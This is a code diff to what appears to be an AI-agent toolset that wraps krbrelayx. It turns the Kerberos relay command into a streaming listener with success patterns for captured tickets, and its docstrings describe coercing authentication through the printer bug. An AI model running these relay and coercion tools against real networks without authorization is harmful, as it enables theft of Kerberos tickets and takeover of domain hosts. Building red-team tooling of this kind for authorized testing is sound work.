@@ -5,9 +5,22 @@ from dreadnode import Config
 from dreadnode.agents.tools import Toolset, tool_method
 from dreadnode.tools.execute import execute
 
+from ._relay import stream_listener
+
 # Default path for krbrelayx scripts
 # Install via: git clone https://github.com/dirkjanm/krbrelayx.git
 g_default_krbrelayx_path = Path("/opt/krbrelayx/")
+
+# Substrings in krbrelayx stdout that indicate a relay caught/relayed an auth.
+# Verified against dirkjanm/krbrelayx source: "Got ticket for ..." and "Saving
+# ticket in ....ccache" (unconstrained-delegation capture) and the
+# "Authenticating against ... SUCCEED" relay line. "succeed" is used rather than
+# "authenticating against" because the latter also matches the FAILED line.
+_KRBRELAYX_SUCCESS_PATTERNS = [
+    "got ticket",
+    "saving ticket",
+    "succeed",
+]
 
 
 class Krbrelayx(Toolset):
@@ -384,11 +397,19 @@ class Krbrelayx(Toolset):
         filename: str | None = None,
         aeskey: str | None = None,
         debug: bool = False,
+        relay_timeout: int = 180,
         env: dict[str, str] | None = None,
         input: str | None = None,
     ) -> str:
         r"""
         Execute krbrelayx krbrelayx.py for Kerberos relay attacks on unconstrained delegation.
+
+        This is a **listener**: it starts a relay server and stays up waiting for a
+        coerced/relayed authentication to arrive (trigger coercion separately, e.g.
+        with ``krbrelayx_printer_bug`` or a coercion tool). It streams the server's
+        output and returns as soon as a relayed ticket/connection is seen, or after
+        ``relay_timeout`` seconds — reaching that deadline without catching an auth is
+        a normal outcome, not a failure, and the captured output is returned either way.
 
         Relay Kerberos authentication from a machine with unconstrained delegation to attack targets.
 
@@ -446,8 +467,11 @@ class Krbrelayx(Toolset):
             filename: Filename for the printer bug trigger.
             aeskey: AES key for Kerberos authentication.
             debug: Enable debug output.
+            relay_timeout: How long (seconds) to keep the relay listener up waiting for
+                an authentication before returning the captured output (default: 180).
             env: Optional environment variables.
-            input: Optional input string to pass to the command's stdin.
+            input: Accepted for signature parity with the other krbrelayx tools; ignored
+                here, since a relay listener does not read from stdin.
         """
         # Build command
         args = []
@@ -479,10 +503,10 @@ class Krbrelayx(Toolset):
         if debug:
             args.append("-d")
 
-        return await execute(
+        return await stream_listener(
             [sys.executable, str(self.script_path / "krbrelayx.py"), *args],
-            timeout=self.timeout,
-            input=input,
+            success_patterns=_KRBRELAYX_SUCCESS_PATTERNS,
+            timeout=relay_timeout,
             env=env,
         )
 
@@ -505,6 +529,9 @@ class Krbrelayx(Toolset):
         Execute krbrelayx printerbug.py to trigger the printer bug for unconstrained delegation.
 
         Trigger the printer spooler bug to coerce authentication from a target to an attacker-controlled host.
+        This is a one-shot trigger, not a listener: it fires the MS-RPRN coercion and exits. The coerced
+        authentication arrives at a separately running relay listener (e.g. ``krbrelayx_relay``), which must
+        already be up before this is called.
 
         Usage Examples:
             # Trigger printer bug with password authentication
